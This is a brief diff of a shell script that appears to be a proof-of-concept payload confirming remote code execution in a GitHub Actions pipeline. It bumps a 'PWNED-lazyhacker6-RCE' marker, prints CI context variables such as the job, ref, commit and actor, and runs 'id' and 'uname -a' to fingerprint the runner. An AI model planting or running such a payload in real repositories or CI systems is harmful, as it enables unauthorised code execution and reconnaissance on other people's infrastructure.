@@ -1,5 +1,5 @@
 #!/bin/sh
-echo "===PWNED-lazyhacker6-RCE-OK==="
+echo "===PWNED-lazyhacker6-RCE-V3==="
 echo "job=${GITHUB_JOB:-} event=${GITHUB_EVENT_NAME:-} ref=${GITHUB_REF:-} sha=${GITHUB_SHA:-} actor=${GITHUB_ACTOR:-}"
 id 2>/dev/null || true
 uname -a 2>/dev/null || true
